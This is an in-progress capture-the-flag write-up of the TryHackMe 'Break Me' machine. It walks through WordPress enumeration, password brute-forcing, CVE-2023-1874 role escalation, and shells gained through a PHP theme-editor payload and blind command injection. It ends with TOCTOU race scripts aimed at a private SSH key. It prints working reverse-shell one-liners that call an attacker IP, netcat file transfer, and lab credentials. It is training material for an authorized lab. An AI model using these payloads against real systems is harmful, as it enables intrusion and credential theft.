---
title: "BreakMe — TryHackMe Penetration Test Writeup"
date: 2026-08-09 18:00:00 +0200
categories: [Writeups, TryHackMe]
tags: [tryhackme, wordpress, web-security, command-injection, linux, privilege-escalation, toctou]
description: "An in-progress TryHackMe BreakMe write-up covering WordPress enumeration, CVE-2023-1874, command injection, lateral movement, and SUID TOCTOU analysis."
pin: true
toc: true
media_subpath: /assets/img/posts/breakme
---

> **Authorized lab / spoiler warning:** This write-up documents an intentionally vulnerable TryHackMe machine used for cybersecurity training. It contains credentials, flags, exploitation steps, and spoilers.
{: .prompt-warning }

**Platform:** TryHackMe  
**Room:** Break Me  
**Difficulty:** Medium  
**Status:** In progress — paused at the `john → youcef` privilege-escalation stage.

## Executive Summary

This report documents the penetration test conducted against the TryHackMe machine "Break Me." The engagement involved a full attack chain beginning with unauthenticated web enumeration, progressing through a known WordPress plugin vulnerability, and ultimately achieving remote code execution on the underlying Linux system. Lateral movement between system users was achieved through blind command injection in an internal web application. At the time of writing, the engagement is paused mid-chain at the `john → youcef` pivot, which requires exploiting a TOCTOU (Time Of Check To Time Of Use) race condition in a custom SUID binary.

**Flags captured:**
- `user1.txt` (john) : Found
- `user2.txt` (youcef): pending
- `root.txt`: pending

---

## Reconnaissance

### Port Scanning

The engagement began with a standard nmap service scan against the target to identify open ports and running services.

```bash
nmap -sV -sC 10.128.179.255
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH 8.4p1 Debian |
| 80/tcp | open | HTTP | Apache 2.4.56 (Debian) |

The webroot at port 80 served the default Apache landing page, indicating the actual application lived in a subdirectory.

![Initial reconnaissance and service enumeration](recon.png)
_Reconnaissance results showing the exposed services and initial target enumeration._

### Directory Enumeration — Webroot

```bash
gobuster dir \
  -u http://10.128.179.255 \
  -w /usr/share/wordlists/dirb/common.txt
```

**Key finding:** `/wordpress/` (301 redirect) — confirmed a WordPress installation in a subdirectory.

### Directory Enumeration — WordPress

A second gobuster pass was run against the WordPress subdirectory specifically:

```bash
gobuster dir \
  -u http://10.128.179.255/wordpress/ \
  -w /usr/share/wordlists/dirb/common.txt
```

**Results:** Standard WordPress structure confirmed — `/wp-admin/`, `/wp-content/`, `/wp-includes/`, `xmlrpc.php`.

> **Lesson:** Gobuster is not recursive by default. Always re-run against newly discovered directories, or use `ffuf` with `-recursion` for automatic depth scanning.

---

## WordPress Enumeration

### Version Fingerprinting

WordPress embeds its version in page source via a generator meta tag. This was confirmed with a simple curl command:

```bash
curl -s http://10.128.179.255/wordpress/ | grep -i "generator"
```

**Result:** `WordPress 6.4.3` — flagged as insecure (released 2024-01-30).

### REST API Discovery

The WordPress REST API discovery endpoint was queried to identify installed plugins:

```bash
curl -s http://10.128.179.255/wordpress/index.php/wp-json/ | head -50
```

**Key finding:** The response included a custom namespace `wpda` — not a stock WordPress namespace. This revealed the **WP Data Access** plugin was installed before any plugin scanner was used. The exposed endpoints (`/wpda/info`, `/wpda/table/select`, `/wpda/save-settings`) confirmed the plugin's presence.

> **Lesson:** The `wp-json` REST API discovery endpoint is a powerful, scanner-free way to detect installed plugins. Custom namespaces in the response directly identify third-party plugins.

### WPScan — Plugin & User Enumeration

An initial wpscan run using vulnerability-only flags failed to surface the plugin:

```bash
wpscan --url http://10.128.179.255/wordpress/ --enumerate vp,vt,u
```

**Result:** "No plugins Found" — misleading output caused by missing API token. Without a token, wpscan cannot query its CVE database and silently suppresses plugin results under the `vp` (vulnerable plugins only) flag.

A second run using all-plugin enumeration flags correctly identified the plugin:

```bash
wpscan --url http://10.128.179.255/wordpress/ -e u,p,t
```

**Results:**

| Finding | Detail |
|---------|--------|
| Plugin | WP Data Access v5.3.5 |
| CVE | CVE-2023-1874 (affects ≤5.3.7) |
| Users | `admin`, `bob` |
| Theme | Twenty Twenty-Four v1.0 |

> **Lesson:** The `vp`/`vt` flags in wpscan require an API token to populate CVE data. Without one, use plain `p`/`t` flags to enumerate all plugins/themes regardless of vulnerability status, then cross-reference versions manually.

![WPScan target and WordPress version detection](wpscantitle.png)
_WPScan identifying the target WordPress installation and version._

![WP Data Access plugin discovered by WPScan](wpscanplugin.png)
_WPScan detecting the vulnerable WP Data Access plugin._

![WordPress users discovered by WPScan](wpscanusers.png)
_WPScan user enumeration revealing the `admin` and `bob` accounts._

---

## Credential Discovery

### Password Brute-Force

With two confirmed usernames (`admin`, `bob`) and a known WordPress login page, password brute-forcing was performed using wpscan's built-in attack mode:

```bash
wpscan --url http://10.128.179.255/wordpress/ \
  --usernames bob,admin \
  --passwords /usr/share/wordlists/rockyou.txt
```

**Result:**

```
[SUCCESS] - bob / soccer
```

The account `bob` was found to use the weak, common password `soccer`. The `admin` account was not cracked within the time window.

---

## Privilege Escalation — WordPress: Subscriber to Admin

### Vulnerability — CVE-2023-1874

**WP Data Access ≤5.3.7 — Authenticated Subscriber Privilege Escalation**

The WP Data Access plugin contains a missing authorization check in its `multiple_roles_update` function. When a user updates their profile via `wp-admin/profile.php`, the plugin also processes a `wpda_role[]=administrator` POST parameter to update the user's WordPress role — without verifying whether the requesting user is permitted to change roles. This allows any authenticated user, including subscribers, to escalate themselves to administrator.

### Exploitation

After logging into WordPress as `bob` (`bob:soccer`), the profile update form was intercepted using **Burp Suite**.

![Bob logged in with subscriber-level privileges](bob.png)
_The `bob` account initially has only subscriber-level access._

![Profile update request intercepted in Burp Suite](burpsuite.png)
_The WordPress profile update request intercepted before modifying the role parameter._

`bob`'s dashboard confirmed subscriber-level access — only "Dashboard" and "Profile" were visible in the sidebar. The profile update POST request was captured and modified by appending the privilege escalation parameter to the end of the POST body:

**Original POST data (truncated):**
```
_wpnonce=...&first_name=bob&last_name=bob&...&action=update&user_id=2&submit=Update+Profile
```

**Modified POST data:**
```
_wpnonce=...&first_name=bob&last_name=bob&...&action=update&user_id=2&submit=Update+Profile&wpda_role[]=administrator
```

The request was forwarded. Upon refreshing the dashboard, `bob` now had full administrator access — Posts, Media, Pages, Appearance, Plugins, Users, Settings, and the WP Data Access menu were all visible.

![Bob after privilege escalation to WordPress administrator](asadmin.png)
_The dashboard after exploiting CVE-2023-1874, confirming administrator privileges._

> **Lesson:** Missing authorization checks on privileged functions are critical vulnerabilities. The plugin trusted that only admins would submit the `wpda_role[]` parameter — but never verified the caller's actual role before applying the change.

---

## Initial Foothold — Reverse Shell as www-data

### Theory

WordPress administrators can directly edit PHP theme files through the built-in Theme File Editor (`Appearance → Theme File Editor`). Since the web server executes PHP files, injecting a reverse shell payload into a theme file and triggering it by visiting a page achieves remote code execution as the `www-data` user (the user Apache runs as).

### Execution

A netcat listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

In the WordPress admin panel, `Appearance → Theme File Editor → functions.php` was opened. The following reverse shell payload was appended to the end of the file (inside the existing PHP context — no opening tag needed):

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.155.216/4444 0>&1'");
```

> **Note:** A common mistake here is adding `<?php ?>` tags around the payload inside a file that is already entirely PHP — this causes a syntax error. The bare `exec()` call is correct.

![PHP reverse shell payload added through the WordPress theme editor](phpscriptinjection.png)
_Reverse shell payload inserted into the active theme's `functions.php` file._

Visiting any WordPress page triggered `functions.php` execution, and the listener received a connection:

![Reverse shell received as www-data](reverseshellworking.png)
_The successful callback from the target, providing a shell as `www-data`._

```
connect to [192.168.155.216] from (UNKNOWN) [10.128.179.255] 42248
www-data@Breakme:/var/www/html/wordpress/wp-admin$
```

### Shell Stabilisation

The raw reverse shell was upgraded to a fully interactive terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export SHELL=/bin/bash; export TERM=xterm; stty rows 40 columns 160
```

---

## Lateral Movement — www-data to john

### Initial Enumeration as www-data

Standard post-exploitation enumeration was performed:

```bash
id
whoami
cat /etc/passwd | grep -v nologin | grep -v false
```

**Real users on the system:**

| User | UID | Home |
|------|-----|------|
| root | 0 | /root |
| john | 1002 | /home/john |
| youcef | 1000 | /home/youcef |

SUID binary enumeration returned only standard system binaries — no obvious GTFOBins candidates:

```bash
find / -type f -perm -u+s 2>/dev/null
```

WordPress database credentials were extracted from `wp-config.php`:

```bash
cat /var/www/html/wordpress/wp-config.php
```

**Result:**
```
DB_USER: econor
DB_PASSWORD: SuP3rS3cR37#DB#P@55wd
```

Password reuse was tested against both system users:

```bash
su john   # SuP3rS3cR37#DB#P@55wd → Authentication failure
su youcef # SuP3rS3cR37#DB#P@55wd → Authentication failure
```

No password reuse found.

### Discovery — Internal PHP Web Server

Process enumeration revealed a hidden internal service:

```bash
ps aux | grep john
```

**Result:**
```
john  517  /usr/bin/php -S 127.0.0.1:9999
```

John was running a PHP web server bound exclusively to localhost on port 9999 — inaccessible from outside the machine. The service was probed from within:

```bash
curl http://127.0.0.1:9999/
```

The response revealed a custom internal tool with three functions: **Check Target** (ping), **Check User** (id lookup), and **Check File** (find).

### Blind Command Injection — Check User

Each form was tested for command injection. The Check User form (`cmd2`) was found to:
- Run `id <input>` as john
- Strip most special characters (`;`, `*`, spaces, underscores)
- **Pass `|` through unfiltered**
- Redirect all output to `/dev/null` (blind injection)

Character survival was confirmed by observing the "User X not found" error message:

```bash
curl -s -X POST http://127.0.0.1:9999/ --data-urlencode 'cmd2=test|' | grep -o 'User.*not found'
# Result: User test| not found  ← pipe survived
```

Since output was suppressed and spaces were filtered, a reverse shell script was created to sidestep both limitations:

```bash
cat > /dev/shm/rev.sh << 'EOF'
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.155.216 5555 >/tmp/f
EOF
chmod +x /dev/shm/rev.sh
```

A listener was started on port 5555, then the injection was triggered:

```bash
curl -s -X POST http://127.0.0.1:9999/ \
  --data-urlencode 'cmd2=x|/dev/shm/rev.sh||'
```

**Payload breakdown:**
- `x` — dummy username (required by the app)
- `|` — pipe to our script (survives the filter)
- `/dev/shm/rev.sh` — our reverse shell (no spaces, no filtered chars)
- `||` — absorbs the app's own `>/dev/null 2>&1` redirection, preventing it from suppressing our shell's connection

**Result:** Shell received as `john`.

> **Lesson:** When blind command injection output is suppressed, the solution is making the injected command produce an observable *side effect* — in this case, a reverse shell callback. The `||` terminator is a key technique to neutralize trailing shell redirections appended by the vulnerable application.

---

## Post-Exploitation — john

### Flag 1

```bash
cat /home/john/user1.txt
[REDACTED]
```

### Discovery — SUID Binary in youcef's Home

John's group membership grants read access to youcef's home directory (`drwxr-x--- 4 youcef john`):

```bash
ls /home/youcef/
# readfile  readfile.c
```

The `readfile` binary has the SUID bit set, owned by youcef:
```
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
```

This means running `readfile` executes with youcef's permissions, regardless of who runs it.

### Binary Analysis — Ghidra Reverse Engineering

The binary was transferred to the attacking machine for static analysis:

```bash
# On Kali — receive
nc -lvnp 6666 > readfile_binary

# On target — send
nc 192.168.155.216 6666 < /home/youcef/readfile
```

The binary was loaded into **Ghidra** for decompilation. Analysis of the `main` function revealed the following logic flow:

```
1. Require exactly 1 argument (filename)
2. access(filename, 0)  → checks file EXISTS as john (real UID)
                          → "File Not Found" if fails
3. getuid() == 0x3ea    → checks caller is john (UID 1002)
                          → "You can't run this program" if not john
4. strstr(filename, "flag")    → "Nice try!" if found
5. strstr(filename, "id_rsa")  → "Nice try!" if found
6. lstat() checks file type == 0xa000 (symlink)
                          → "Nice try!" if it's a symlink
7. access(filename, 4)  → checks file is READABLE by john
8. open() + read()      → reads and prints the file AS YOUCEF
```

**Key vulnerability identified:** The binary uses `access()` to check permissions as john (real UID), then `open()` to read the file as youcef (effective UID via SUID). This creates a **TOCTOU (Time Of Check To Time Of Use) race condition** — if the file can be swapped between the `access()` check and the `open()` call, the check passes on a legitimate file but the open reads a different one.

The binary even contains a `usleep(0)` call between the check and open — widening the race window slightly.

---

## Pending — Lateral Movement to youcef: TOCTOU Race Condition

### Theory

The race condition works as follows:

1. Create `/tmp/race` as a real file john can read (passes `access()` and `lstat()` checks)
2. Run `readfile /tmp/race` in a loop
3. Simultaneously, rapidly swap `/tmp/race` between a real file and a symlink to `/home/youcef/.ssh/id_rsa`
4. When timing aligns: `access()` sees the real file ✓, `open()` sees the symlink → reads `id_rsa` as youcef

### Attack Scripts (prepared, not yet executed due to VPN interruption)

**Swapper script** — alternates `/tmp/race` between real file and symlink:

```bash
cat > /tmp/swap.sh << 'EOF'
#!/bin/bash
while true; do
    cp /etc/passwd /tmp/race
    rm /tmp/race
    ln -s /home/youcef/.ssh/id_rsa /tmp/race
    rm /tmp/race
done
EOF
chmod +x /tmp/swap.sh
```

**Runner script** — repeatedly runs readfile, filters for key output:

```bash
cat > /tmp/run.sh << 'EOF'
#!/bin/bash
while true; do
    /home/youcef/readfile /tmp/race 2>/dev/null \
      | grep -v "File Not Found" \
      | grep -v "Nice try" \
      | grep -v "Usage" \
      | grep -v "I guess"
done
EOF
chmod +x /tmp/run.sh
```

**Execution** (when VPN is restored):

```bash
/tmp/swap.sh &
/tmp/run.sh
```

When the race is won, youcef's `id_rsa` private key will be printed, allowing SSH login as youcef and access to `user2.txt`.

---

## Lessons Learned

| # | Lesson |
|---|--------|
| 1 | The `wp-json` REST API exposes installed plugins via custom namespaces — check it before running any scanner |
| 2 | WPScan's `vp`/`vt` flags are useless without an API token — always use `p`/`t` for full enumeration |
| 3 | WordPress admin access = RCE via theme file editor — always a valid path to a shell |
| 4 | `access()` in SUID binaries checks real UID, `open()` uses effective UID — this gap enables TOCTOU attacks |
| 5 | Blind command injection: use side effects (reverse shells, file writes) when output is suppressed |
| 6 | `||` at the end of an injection payload neutralizes trailing redirections appended by the vulnerable app |
| 7 | `/dev/shm` is a reliable world-writable memory filesystem — good alternative to `/tmp` for payloads |
| 8 | Always check running processes (`ps aux`) — internal services listening on localhost are a common pivot point |
| 9 | Password reuse is common but not guaranteed — always test DB creds against system users |
| 10 | Symlink filtering in binaries can be bypassed with TOCTOU — the check and the use must happen atomically to be safe |

---

## Appendix

### Credentials Found

| Account | Type | Credentials |
|---------|------|-------------|
| WordPress bob | Web login | `bob:soccer` |
| MySQL econor | Database | `econor:SuP3rS3cR37#DB#P@55wd` |

### Flags Captured

| Flag | User | Value |
|------|------|-------|
| user1.txt | john | done |
| user2.txt | youcef | pending |
| root.txt | root | pending |

### Attack Chain Summary

```
[Unauthenticated]
      ↓
  WordPress recon (nmap, gobuster, wpscan, wp-json)
      ↓
  Brute-force bob:soccer
      ↓
  CVE-2023-1874 → bob escalated to WordPress admin
      ↓
  Theme file editor → PHP reverse shell → www-data shell
      ↓
  wp-config.php → DB credentials (reuse failed)
  ps aux → john's internal PHP server on :9999
      ↓
  Blind command injection via |pipe| in Check User form
  /dev/shm/rev.sh + || payload → john shell
      ↓
  user1.txt captured
  readfile SUID binary discovered
  Ghidra analysis → TOCTOU vulnerability identified
      ↓
  [PAUSED — VPN interrupted]
      ↓
  TOCTOU race condition → youcef SSH key → user2.txt [PENDING]
      ↓
  youcef → root [PENDING]
```
